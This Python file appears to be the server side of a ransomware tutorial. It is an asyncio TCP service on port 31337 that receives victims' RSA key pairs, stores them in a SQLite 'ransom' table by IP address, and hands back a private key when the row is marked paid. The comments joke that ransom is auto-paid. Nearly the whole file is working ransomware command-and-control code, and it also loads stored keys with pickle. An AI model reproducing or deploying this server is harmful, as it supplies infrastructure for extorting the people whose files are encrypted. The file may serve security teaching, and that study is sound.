#!/usr/bin/env python
#! coding: utf-8



'''
This code is out of the scope of the tutorial. if you understand it, great,
otherwise please know there are some lazy programming practices in here (lazy 
is an understatement; by lazy I mean I just wanted to get this over with and
cut so many corners it's almost spherical) and as such, it's not exactly 
something to aspire to. maybe you can fix it up if you're so anal-retentive
'''



import json
import asyncio
import sqlite3
import pickle



class RSA_KEY(list):
    def __init__(self, *args):
        super().__init__(*args)
        if len(self) != 2:
            raise ValueError('key must be in format (mod, exp)')
    
    
def store_key(key):
    return pickle.dumps(key)
    
    
def get_key(key):
    return pickle.loads(key)

def init_db():
    sqlite3.register_converter('RSA_KEY', get_key)
    sqlite3.register_adapter(RSA_KEY, store_key)
    conn = sqlite3.connect('pks.sqlite', detect_types=sqlite3.PARSE_DECLTYPES)
    conn.row_factory = sqlite3.Row
    conn.executescript('''
        create table if not exists ransom(
            ip_address text not null,
            private_key RSA_KEY unique not null,
            public_key RSA_KEY unique not null,
            ransom_paid integer not null
        );
    ''')
    return conn
   

async def close_connection(writer, msg=''):
    print(msg)
    await writer.drain()
    writer.close()
    await writer.wait_closed()


async def handle_connection(conn, reader, writer):
    client_ip, client_port = writer.get_extra_info('peername')
    
    print('[+] Connection from {}:{}'.format(client_ip, client_port))
    data = asyncio.wait_for(reader.read(1024), 3)
    try:
        data = json.loads(await data)
    except asyncio.TimeoutError:
        await close_connection(writer, '[-] {} timed out'.format(client_ip))
        return
    except Exception as e:
        await close_connection(writer, '[-] {}'.format(e))
        return
    
    print('[+] {} says: {}'.format(client_ip, data))
    
    
    # unpack private key, store as pickled list
    if 'keypair' in data:
        print('[+] {} sent key pair'.format(client_ip))
        private_key, public_key = data['keypair']
        private_key = RSA_KEY(private_key)
        public_key = RSA_KEY(public_key)
        try:
            conn.execute(
                'insert into ransom values(?,?,?,?)',
                (client_ip, private_key, public_key, 1)  # auto-pay ransom :)
            )
        except sqlite3.IntegrityError:
            print('[-] tried to insert key, but it exists!!')
        else:
            print(f'[+] {client_ip}: Key saved!')
            
    # unpack public key, query db for matching private, send if ransom paid
    elif 'pubkey' in data:
        print('[+] {} sent private key'.format(client_ip))
        public_key = data['pubkey']
        public_key = RSA_KEY(public_key)
    
        record = conn.execute(
            'SELECT * FROM ransom WHERE public_key = ?',
            (public_key,)
        ).fetchone()
        
        if record:
            if record['ransom_paid'] > 0:
                writer.write(json.dumps(record['private_key']).encode())
        else:
            print(f'[+] {client_ip}: Key not found!')
            
    else:
        print('[-] {} tried to hack us :('.format(client_ip))
        
    await close_connection(writer, f'[+] {client_ip}: Disconnect')


async def keyboardinterrupt():
    while True:
        await asyncio.sleep(1)
        

async def amain(conn):
    port = 31337
    handler = lambda r, w: handle_connection(conn,r,w)
    server = await asyncio.start_server(handler, host='localhost' ,port=port)
    print(f'server is running on port {port}')
    async with server:
        await server.serve_forever()
    

def main():
    conn = init_db()
    loop = asyncio.get_event_loop()
    loop.create_task(keyboardinterrupt())  # hack until python 3.8
    loop.create_task(amain(conn))
    try:
        loop.run_forever()
    except KeyboardInterrupt as e:
        print("Shutting down server...")
        conn.close()
        loop.stop()
        loop.run_until_complete(loop.shutdown_asyncgens())
    
    
if __name__ == '__main__':
    main()
    print('done.')